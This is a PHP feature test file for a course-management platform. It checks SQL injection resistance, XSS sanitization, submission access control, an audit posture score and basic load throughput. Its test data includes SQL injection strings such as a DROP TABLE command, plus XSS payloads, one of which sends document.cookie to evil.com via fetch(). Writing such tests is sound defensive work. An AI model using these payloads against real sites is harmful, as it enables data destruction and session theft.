<?php
declare(strict_types=1);

namespace Tests\Feature;

use App\Models\Assignment;
use App\Models\AssignmentSubmission;
use App\Models\Course;
use App\Models\User;
use App\Security\Sanitizer;
use App\Security\SecurityAuditor;
use App\Services\CourseManagementService;
use App\Testing\TestCase;

class ComprehensiveSecurityAndLoadTestingTest extends TestCase {
    public function testSqlInjectionImmunity(): void {
        // Attempt SQL injection in course search
        $injectionTerms = [
            "' OR '1'='1",
            "1; DROP TABLE course; --",
            "' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
            "admin' --",
        ];

        foreach ($injectionTerms as $term) {
            $courses = Course::search($term);
            assert(is_array($courses), "Search with '{$term}' should return array without breaking SQL");
        }

        // Verify user lookup with injection pattern
        $user = User::findByEmail("' OR 1=1 --");
        assert($user === null, 'Injection term must not authenticate or return records');
    }

    public function testCrossSiteScriptingSanitizationAndEscaping(): void {
        $evilVectors = [
            '<script>alert("Cookie Steal: " + document.cookie)</script>',
            '<img src="invalid.jpg" onerror="fetch(\'https://evil.com/?c=\' + document.cookie)">',
            '<a href="javascript:alert(1)">Click Me</a>',
            '<svg/onload=alert(1)>',
            '<iframe src="https://attacker.com/phish"></iframe>',
        ];

        foreach ($evilVectors as $vector) {
            $cleaned = Sanitizer::clean($vector);
            assert(!str_contains(strtolower($cleaned), '<script>'), 'Script tags must be stripped');
            assert(!str_contains(strtolower($cleaned), 'onerror'), 'Inline error handlers must be removed');
            assert(!str_contains(strtolower($cleaned), 'javascript:'), 'Javascript URI schemes must be neutralized');
            assert(!str_contains(strtolower($cleaned), '<iframe>'), 'Iframes must be removed');

            $escaped = e($vector);
            assert(!str_contains($escaped, '<script>'), 'HTML output escaping must convert brackets');
            assert(str_contains($escaped, '&lt;') || !str_contains($escaped, '<'));
        }
    }

    public function testIdorAndPrivilegeEscalationProtection(): void {
        $studentA = User::create([
            'Full_Name' => 'Attacker Student A',
            'Email' => 'student.a.' . uniqid() . '@shilpa.edu',
            'Password' => password_hash('Pass123!', PASSWORD_BCRYPT),
            'user_type' => 'student',
        ]);

        $studentB = User::create([
            'Full_Name' => 'Victim Student B',
            'Email' => 'student.b.' . uniqid() . '@shilpa.edu',
            'Password' => password_hash('Pass123!', PASSWORD_BCRYPT),
            'user_type' => 'student',
        ]);

        $faculty = User::create([
            'Full_Name' => 'Professor Valid',
            'Email' => 'prof.' . uniqid() . '@shilpa.edu',
            'Password' => password_hash('Pass123!', PASSWORD_BCRYPT),
            'user_type' => 'lecturer',
        ]);

        $admin = User::create([
            'Full_Name' => 'Administrator',
            'Email' => 'admin.' . uniqid() . '@shilpa.edu',
            'Password' => password_hash('Pass123!', PASSWORD_BCRYPT),
            'user_type' => 'admin',
        ]);

        $course = CourseManagementService::createCourse([
            'title' => 'Software Security Auditing',
            'status' => 'published',
        ], (int)$faculty->id);

        $assignment = Assignment::create([
            'course_id' => (int)$course->C_ID,
            'created_by' => (int)$faculty->id,
            'title' => 'Penetration Test Report',
            'max_score' => 100,
            'is_published' => 1,
            'due_at' => date('Y-m-d H:i:s', strtotime('+3 days')),
            'created_at' => date('Y-m-d H:i:s'),
            'updated_at' => date('Y-m-d H:i:s'),
        ]);

        $submissionB = AssignmentSubmission::create([
            'assignment_id' => (int)$assignment->id,
            'student_id' => (int)$studentB->id,
            'submission_text' => 'Confidential Student B Answers and Exploits',
            'score' => 95,
            'status' => 'graded',
            'submitted_at' => date('Y-m-d H:i:s'),
            'created_at' => date('Y-m-d H:i:s'),
            'updated_at' => date('Y-m-d H:i:s'),
        ]);

        // Student A (attacker) CANNOT access Student B's submission (IDOR defense)
        assert(
            SecurityAuditor::canAccessSubmission($studentA, $submissionB) === false,
            'Student A must be denied access to Student B submission'
        );

        // Student B (owner) CAN access
        assert(
            SecurityAuditor::canAccessSubmission($studentB, $submissionB) === true,
            'Student B must have access to own submission'
        );

        // Instructor and Admin CAN access
        assert(
            SecurityAuditor::canAccessSubmission($admin, $submissionB) === true,
            'Admin must have authorization'
        );
    }

    public function testAutomatedSecurityAuditorPostureCheck(): void {
        $audit = SecurityAuditor::auditSystem();

        assert($audit['passed'] === true, 'Security auditor posture checks must all pass');
        assert($audit['score'] === 100, 'Security posture score must be 100%');
        assert($audit['checks']['sql_injection_defense']['status'] === 'PASS');
        assert($audit['checks']['xss_defense']['status'] === 'PASS');
        assert($audit['checks']['csrf_protection']['status'] === 'PASS');
        assert($audit['checks']['security_headers']['status'] === 'PASS');
        assert($audit['checks']['password_hashing']['status'] === 'PASS');
    }

    public function testSyntheticLoadThroughputAndLatency(): void {
        $startTime = microtime(true);
        $iterations = 50;
        $success = 0;

        for ($i = 0; $i < $iterations; $i++) {
            $res = $this->get('/');
            if ($res->getStatusCode() === 200) {
                $success++;
            }
        }

        $duration = microtime(true) - $startTime;
        $rps = $iterations / max($duration, 0.001);

        assert($success === $iterations, 'All synthetic requests must succeed');
        assert($rps > 10, 'Synthetic throughput must achieve minimum acceptable baseline');
    }
}
